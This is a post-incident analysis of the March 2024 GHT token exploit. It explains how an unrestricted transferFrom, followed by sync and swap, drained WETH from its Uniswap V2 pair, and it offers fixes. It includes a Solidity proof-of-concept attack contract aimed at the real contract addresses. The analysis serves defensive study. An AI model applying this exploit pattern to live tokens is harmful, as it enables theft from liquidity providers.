# GHT — transferFrom + sync Reserve Manipulation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | GHT |
| **Chain** | Ethereum |
| **Loss** | ~$57,000 |
| **Attacker** | [0x096f0f03](https://etherscan.io/address/0x096f0f03e4be68d7e6dd39b22a3846b8ce9849a3) |
| **Attack Contract** | [0xcc5159b5](https://etherscan.io/address/0xcc5159b5538268f45afda7b5756fa8769ce3e21f) |
| **GHT Token** | [0x528e046A](https://etherscan.io/address/0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0) |
| **WETH-GHT Pair** | [0x706206Ea](https://etherscan.io/address/0x706206EabD6A70ca4992eEc1646B6D1599259CAe) |
| **Root Cause** | Used GHT token's `transferFrom()` to drain the pair balance down to 1, called `sync()` to update reserves, then transferred a large amount of GHT back and exploited the price discrepancy via `swap()` to drain WETH |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/GHT_exp.sol) |

---

## 1. Vulnerability Overview

GHT token's `transferFrom()` is implemented in a way that allows tokens to be withdrawn directly from the pair contract. The attacker drained nearly all GHT from the pair, leaving only 1 token, then called `sync()` to update reserves to an extremely low value. Subsequently, transferring a large amount of GHT back into the pair created an extreme mismatch between the actual balance and the reserves, allowing the attacker to extract an excessive amount of WETH via `swap()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: transferFrom allows direct withdrawal from pair balance
interface IGHT {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface Uni_Pair_V2 {
    function sync() external;
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

// GHT.transferFrom(pair, attacker, balance-1) → pair balance = 1
// pair.sync() → reserve = 1
// GHT.transfer(pair, balance-1) → pair balance = balance
// reserve = 1 but actual balance = balance → extreme mismatch
// pair.swap(WETH_amount, 0, attacker, "") → large WETH withdrawal

// ✅ Safe code: enforce strict transferFrom caller validation
function transferFrom(address from, address to, uint256 amount) external returns (bool) {
    // Allow balance transfer from `from` only via allowance mechanism
    // Special validation required when pair contract is the `from` address
    require(allowance[from][msg.sender] >= amount, "insufficient allowance");
    allowance[from][msg.sender] -= amount;
    _transfer(from, to, amount);
    return true;
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] GHT.transferFrom(pair, attacker, pairBalance - 1)
  │         └─ Pair GHT balance reduced to 1
  │
  ├─→ [2] pair.sync()
  │         └─ reserve_GHT updated to 1
  │
  ├─→ [3] GHT.transferFrom(attacker, pair, pairBalance - 1)
  │         └─ Pair GHT actual balance = pairBalance
  │         └─ Reserve = 1 vs actual balance = pairBalance (extreme mismatch)
  │
  ├─→ [4] pair.swap(wethOut, 0, attacker, "")
  │         └─ Excessive WETH extracted based on reserve mismatch
  │
  └─→ [5] ~$57K WETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IGHT {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface Uni_Pair_V2 {
    function sync() external;
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract AttackContract {
    IGHT        constant GHT  = IGHT(0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0);
    Uni_Pair_V2 constant pair = Uni_Pair_V2(0x706206EabD6A70ca4992eEc1646B6D1599259CAe);
    IERC20      constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testExploit() external {
        // [1] Drain nearly all GHT from the pair
        uint256 pairGHT = GHT.balanceOf(address(pair));
        GHT.transferFrom(address(pair), address(this), pairGHT - 1);

        // [2] Set reserves to an extremely low value
        pair.sync();

        // [3] Transfer the drained GHT back into the pair
        GHT.transferFrom(address(this), address(pair), pairGHT - 1);

        // [4] Extract large amount of WETH via reserve mismatch
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 wethOut = calculateWETHOut(r0, r1, pairGHT - 1);
        pair.swap(wethOut, 0, address(this), "");
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | transferFrom + sync reserve desynchronization manipulation |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (transferFrom + sync + swap combination) |
| **DApp Classification** | ERC20 token + Uniswap V2 pair |
| **Impact** | LP WETH drained via reserve manipulation |

## 6. Remediation Recommendations

1. **Strict transferFrom allowance enforcement**: Block unlimited transfers when the pair contract is the `from` address
2. **Pre/post-sync validation**: Revert if the reserve change rate after `sync()` exceeds a threshold
3. **Minimum pair balance protection**: Block transfers that would reduce the pair's GHT balance below a threshold
4. **Internal balance tracking**: Track pair balance via internal variables instead of relying on `balanceOf()`

## 7. Lessons Learned

- The `transferFrom(pair, attacker, amount)` pattern directly extracts tokens held by the pair and must therefore be permitted only through allowance-based mechanisms.
- Drastically reducing the pair balance immediately before `sync()` creates a reserve-balance mismatch that causes excessive output in subsequent swaps.
- For pairs holding LP tokens, any anomaly in the underlying token's transfer logic can directly lead to immediate LP drainage.